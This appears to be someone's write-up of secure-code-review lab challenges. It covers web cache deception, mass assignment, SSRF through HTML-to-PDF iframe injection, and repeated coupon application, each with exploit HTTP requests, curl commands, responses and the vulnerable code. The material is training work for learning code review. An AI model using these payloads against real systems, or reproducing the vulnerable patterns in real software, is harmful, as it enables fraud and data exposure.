app.get("/profile*", (req, res) => {
    if (!req.session.user) {
        return res.redirect("/login");
    }

    const user = req.session.user;
    const api_key = users_db[user].api_key;

    res.send(`${user} - API Key: ${api_key}`);
});
The application uses a wildcard route, `/profile*`, which causes any path beginning with `/profile` to be handled by the same profile endpoint. This means that requests such as `/profile/test.css` are treated by the backend as valid profile requests and return sensitive user-specific data, including the API key.
In an environment with a reverse proxy or web cache, this becomes a Web Cache Deception issue. The cache may interpret `/profile/test.css` as a static asset and store the response, even though the backend generated dynamic authenticated content. An attacker can exploit this by tricking an authenticated admin into visiting the crafted URL, causing the sensitive profile response to be cached and later served to unauthenticated users.

--Challenge29--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-29>python main.py
Vulnerability: Mass Assignment allowing unauthorized modification of protected invoice fields
Exploit:
POST /invoices HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/json
Content-Length: 155

{
  "customer_name": "attacker",
  "billing_address": "fake street 123",
  "vat_id": "EVIL-123",
  "description": "Premium invoice",
  "paid": true
}
Response:
{"amount":99.0,"billing_address":"fake street 123","customer_name":"attacker","description":"Premium invoice","id":1,"paid":true,"vat_id":"EVIL-123"}
Vulnerable Code:
@app.route("/invoices", methods=["POST"])
def create_invoice():
    data = request.json or {}

    # Amount is server-controlled (e.g., from the authenticated user's plan/contract)
    data["amount"] = get_amount_for_current_user()
    invoice = Invoice(**data)

    db.session.add(invoice)
    db.session.commit()
    return jsonify(invoice.to_dict()), 201
The application accepts a JSON body and passes it directly into the Invoice model constructor using Invoice(**data). Although the amount field is overwritten server-side, other sensitive fields such as paid remain fully attacker-controlled. This is a classic mass assignment issue, where the client can set properties that should only be managed by server-side business logic.
As a result, an attacker can create invoices that are already marked as paid without going through the intended payment flow in /pay/<invoice_id>. This breaks the integrity of the invoice lifecycle and may lead to business logic abuse, fraud, or unauthorized state changes.

--Challenge30--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-30>go mod init challenge-30
C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-30>go mod tidy
C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-30>go run main.go
Vulnerability: Server-Side Request Forgery (SSRF) / Local File Read via HTML-to-PDF injection
Exploit: 
POST /render HTTP/1.1
Host: localhost:5000
Content-Type: application/json
{
  "content": "<iframe src='https://dub-flow.com' style='width:100%;height:800px;border:none;'></iframe>"
}
┌──(witty㉿WITTY)-[~]
└─$ ip route
default via 172.25.144.1 dev eth0 proto kernel
┌──(witty㉿WITTY)-[~]
└─$ curl -X POST http://172.25.144.1:5000/render -H "Content-Type: application/json" --data "{\"content\":\"<iframe src='https://dub-flow.com' style='width:100%;height:800px;border:none;'></iframe>\"}" --output out.pdf
Checking: ┌──(witty㉿WITTY)-[~]
└─$ evince out.pdf
C:\Users\jesus.gavancho>python -m http.server 8000
POST /render HTTP/1.1
Host: localhost:5000
Content-Type: application/json
{
  "content": "<iframe src='http://127.0.0.1:8000' style='width:100%;height:800px;border:none;'></iframe>"
}
┌──(witty㉿WITTY)-[~]
└─$ curl -X POST http://172.25.144.1:5000/render -H "Content-Type: application/json" --data "{\"content\":\"<iframe src=
'http://172.25.144.1:8000' style='width:100%;height:800px;border:none;'></iframe>\"}" --output out1.pdf
┌──(witty㉿WITTY)-[~]
└─$ evince out1.pdf   (Can see my files)
Vulnerable Code:
html := fmt.Sprintf(`
<html><body>
  <h1>Company Report</h1><hr/>
  %s
  <hr/><footer>Generated by Challenge 30 - PDF API</footer>
</body></html>`, req.Content)

pdfg, _ := wkhtmltopdf.NewPDFGenerator()
pdfg.AddPage(wkhtmltopdf.NewPageReader(bytes.NewReader([]byte(html))))
if err := pdfg.Create(); err != nil {
        http.Error(w, "PDF gen failed", 500)
        return
}
The application injects user-controlled HTML into a template rendered by wkhtmltopdf. Since the PDF engine processes external resources such as <iframe> and <img>, an attacker can force the server to make arbitrary HTTP requests during PDF generation.
In this case, the attacker hosted a local HTTP service and injected an iframe pointing to it. The server fetched the resource and embedded its contents into the generated PDF, proving that requests are executed server-side and their responses are returned to the attacker.
This confirms a full SSRF primitive with data exfiltration capabilities.

--Challenge31--
Execution: C:\Users\jesus.gavancho\Downloads\nginx-1.28.3\nginx-1.28.3\conf>mkdir C:\nginx-cache
C:\Users\jesus.gavancho\Downloads\nginx-1.28.3\nginx-1.28.3>nginx.exe -t
C:\Users\jesus.gavancho\Downloads\nginx-1.28.3\nginx-1.28.3>start nginx
C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-31>go run main.go
Vulnerability: Web Cache Deception due to wildcard route matching authenticated content and Nginx caching static-looking paths
Exploit:
GET /me/test.css HTTP/1.1
Host: 127.0.0.1
Cookie: user=test
Response: X-Cached: HIT
Copy url http://127.0.0.1/me/test.css
Welcome, test
GET /me/test1.css HTTP/1.1
Host: 127.0.0.1
Cookie: user=admin
Response: X-Cached: HIT
Copy url http://127.0.0.1/me/test1.css
Welcome, admin
Vulnerable Code:
app.All("/me*", func(c *fiber.Ctx) error {
        u := currentUser(c)
        if u == "" {
                return c.Redirect("/login")
        }

        return c.Type("html").SendString(fmt.Sprintf(`<h1>Welcome, %s</h1>`, u))
})
location ~* \.(css|js|jpg|png|gif)$ {
    proxy_pass http://fiber-app:5000;
    expires 30d;
    proxy_cache STATIC;
    proxy_cache_valid 200 1h;
    proxy_cache_valid any 5m;
    add_header X-Cached $upstream_cache_status;
}
The application serves authenticated profile content through the wildcard route /me*, meaning any path that begins with /me is treated as a valid profile endpoint. At the same time, Nginx is configured to cache any response for URLs ending in static file extensions such as .css, .js, .jpg, .png, or .gif.
This creates a Web Cache Deception vulnerability. A path like /me/test.css is interpreted by the backend as a dynamic authenticated profile page, while Nginx interprets it as a cacheable static asset. As a result, user-specific content can be stored in the shared cache and later retrieved by requesting the same URL, exposing authenticated data without requiring a valid session.

--Challenge32--
Execution: C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-32>npm install express
C:\Users\jesus.gavancho\Downloads\secure-code-review-challenges\challenge-32>node main.js
Vulnerability: Business Logic Flaw due to repeated coupon application
Exploit:
POST /cart HTTP/1.1
Host: 127.0.0.1:3000
Response: {"id":"14affb56-79e5-45ce-914f-a54fdc47ccb9","items":[],"discountCents":0}
POST /cart/14affb56-79e5-45ce-914f-a54fdc47ccb9/item HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
{
  "productId": "p2",
  "qty": 1
}
Response: {"id":"14affb56-79e5-45ce-914f-a54fdc47ccb9","items":[{"productId":"p2","qty":1}],"discountCents":0}
Send many times
POST /cart/14affb56-79e5-45ce-914f-a54fdc47ccb9/apply-coupon HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
{
  "code": "PROMO10"
}
Response: {"message":"Coupon applied"}
Checking it
GET /cart/14affb56-79e5-45ce-914f-a54fdc47ccb9 HTTP/1.1
Host: 127.0.0.1:3000
Response: {"cartId":"14affb56-79e5-45ce-914f-a54fdc47ccb9","subtotalCents":3000,"discountCents":3900,"totalCents":0}
Vulnerable Code:
app.post("/cart/:id/apply-coupon", (req, res) => {
  const cart = carts.get(req.params.id);
  const coupon = coupons.get(String(req.body.code).toUpperCase());
  if (!cart || !coupon?.active) return res.sendStatus(400);

  cart.discountCents += Math.floor(subtotal(cart) * coupon.percentOff / 100);

  res.json({ message: "Coupon applied" });
});
The application allows the same coupon to be applied repeatedly to the same cart without any validation to prevent reuse. Each time the coupon endpoint is called, the discount is added again to cart.discountCents, regardless of whether that coupon was already used.
As a result, an attacker can repeatedly send the same coupon request and accumulate discounts far beyond the intended promotional value. This breaks the checkout logic and allows the total price to be artificially reduced, potentially to zero.

In real pentest / code review:
-80% of findings → static analysis
-You don’t always run the app
-You read → identify sink → confirm vuln
